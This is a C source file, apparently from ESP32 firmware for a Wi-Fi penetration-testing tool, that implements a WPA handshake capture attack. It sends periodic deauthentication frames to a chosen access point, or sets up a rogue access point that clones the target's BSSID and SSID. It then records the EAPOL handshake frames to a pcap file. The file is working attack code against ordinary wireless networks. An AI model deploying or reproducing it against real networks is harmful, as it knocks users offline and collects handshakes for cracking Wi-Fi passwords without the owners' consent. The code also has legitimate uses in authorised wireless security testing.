#include "attack_handshake.h"

#include <string.h>
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_timer.h"
#include "esp_wifi_types.h"

#include "attack.h"
#include "deauther.h"
#include "wifi_controller.h"
#include "frame_analyzer.h"
#include "pcap_serializer.h"

static const char *TAG = "main:attack_handshake";
static esp_timer_handle_t deauth_timer_handle;
static attack_handshake_methods_t method = -1;
static uint8_t mac_ap_orig[6];
static const wifi_ap_record_t *ap_record = NULL;

static void handshake_capture_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data) {
    ESP_LOGD(TAG, "Processing handshake frame...");
    wifi_promiscuous_pkt_t *frame = (wifi_promiscuous_pkt_t *) event_data;
    for(unsigned i = 0; i < frame->rx_ctrl.sig_len; i++){
        printf("%02x", frame->payload[i]);
    }
    printf("\n");
    attack_append_status_content(frame->payload, frame->rx_ctrl.sig_len);
    pcap_serializer_append_frame(frame->payload, frame->rx_ctrl.sig_len, frame->rx_ctrl.timestamp);
}

static void timer_send_deauth_frame(void* arg){
    deauther_send_deauth_frame(ap_record);
}

static void attack_handshake_method_broadcast(){
    const esp_timer_create_args_t deauth_timer_args = {
        .callback = &timer_send_deauth_frame
    };
    ESP_ERROR_CHECK(esp_timer_create(&deauth_timer_args, &deauth_timer_handle));
    ESP_ERROR_CHECK(esp_timer_start_periodic(deauth_timer_handle, 5 * 1000000));
}

static void attack_handshake_method_rogueap(){
    ESP_LOGD(TAG, "Configuring Rogue AP");
    wifictl_get_ap_mac(mac_ap_orig);
    wifictl_set_ap_mac(ap_record->bssid);
    wifi_config_t ap_config = {
        .ap = {
            .ssid_len = strlen((char *)ap_record->ssid),
            .channel = ap_record->primary,
            .authmode = ap_record->authmode,
            .password = "dummypassword",
            .max_connection = 1
        },
    };
    mempcpy(ap_config.sta.ssid, ap_record->ssid, 32);
    wifictl_ap_start(&ap_config);
}

void attack_handshake_start(attack_config_t *attack_config){
    ESP_LOGI(TAG, "Starting handshake attack...");
    method = attack_config->method;
    ap_record = attack_config->ap_record;
    pcap_serializer_init();
    wifictl_sniffer_filter_frame_types(true, false, false);
    wifictl_sniffer_start(ap_record->primary);
    frame_analyzer_capture_start(SEARCH_HANDSHAKE, ap_record->bssid);
    ESP_ERROR_CHECK(esp_event_handler_register(DATA_FRAME_EVENTS, DATA_FRAME_EVENT_EAPOLKEY_FRAME, &handshake_capture_handler, NULL));
    switch(attack_config->method){
        case ATTACK_HANDSHAKE_METHOD_BROADCAST:
            ESP_LOGD(TAG, "ATTACK_HANDSHAKE_METHOD_BROADCAST");
            attack_handshake_method_broadcast();
            break;
        case ATTACK_HANDSHAKE_METHOD_ROGUE_AP:
            ESP_LOGD(TAG, "ATTACK_HANDSHAKE_METHOD_ROGUE_AP");
            attack_handshake_method_rogueap();
            break;
        default:
            ESP_LOGD(TAG, "Method unknown! Fallback to ATTACK_HANDSHAKE_METHOD_BROADCAST");
            attack_handshake_method_broadcast();
    }
}

void attack_handshake_stop(){
    switch(method){
        case ATTACK_HANDSHAKE_METHOD_BROADCAST:
            ESP_ERROR_CHECK(esp_timer_stop(deauth_timer_handle));
            esp_timer_delete(deauth_timer_handle);
            break;
        case ATTACK_HANDSHAKE_METHOD_ROGUE_AP:
            wifictl_mgmt_ap_start();
            wifictl_set_ap_mac(mac_ap_orig);
            break;
        default:
            ESP_LOGE(TAG, "Unknown attack method! Attack may not be stopped properly.");
    }
    wifictl_sniffer_stop();
    frame_analyzer_capture_stop();
    ESP_ERROR_CHECK(esp_event_handler_unregister(ESP_EVENT_ANY_BASE, ESP_EVENT_ANY_ID, &handshake_capture_handler));
    ap_record = NULL;
    method = -1;
    ESP_LOGD(TAG, "Handshake attack stopped");
}